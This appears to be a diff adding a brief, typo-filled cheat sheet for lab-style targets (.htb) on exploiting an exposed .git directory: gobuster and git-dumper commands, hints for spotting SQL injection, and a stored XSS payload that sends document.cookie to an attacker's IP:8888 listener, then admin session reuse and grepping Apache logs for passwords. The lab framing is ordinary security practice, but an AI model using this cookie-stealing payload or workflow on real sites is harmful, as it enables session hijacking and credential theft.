@@ -1,0 +1,15 @@
+a simple guide when you find a .git/
+
+youy just went through a gobuster scan or a dirscan and found that your domain has a .git/
+1) gobuster dir -u http ://<domain>.htb/.git -w /usr/share/wordlists/dirb/common.txt -b 404,403
+
+2) git-dumper http://.htb/.git  
+  if no permission to access it via web:
+  1) go at the files you download from dumper and read them. Focus on files with names like: accept, config, values etc (use Phpstorm, go to downloads, cd PhpStorm/bin and ./phpstorm.sh)
+    What you might find:
+    a) "sql_insert" : if not properly, might have sqli, if there is "prepare" then its secured.
+    b) "md5" : is not safe way to encypt
+    c) "username" , not protected --> <script>document.location='http ://myIP:8888/?c='+document.cookie;</script> and opened a python3 -m http.server 8888
+        1) might take the PHPSESSID=e3jmt3a6cknkljlag8mnnrck9k which is an admin cookie, you put it on website coockie and access the /admin.php
+3) if logged in with ssh in a user:
+    a) cd /var/log/apache2 , and if there is a access.log , grep <admin_name> access.log, and you gonna find his password
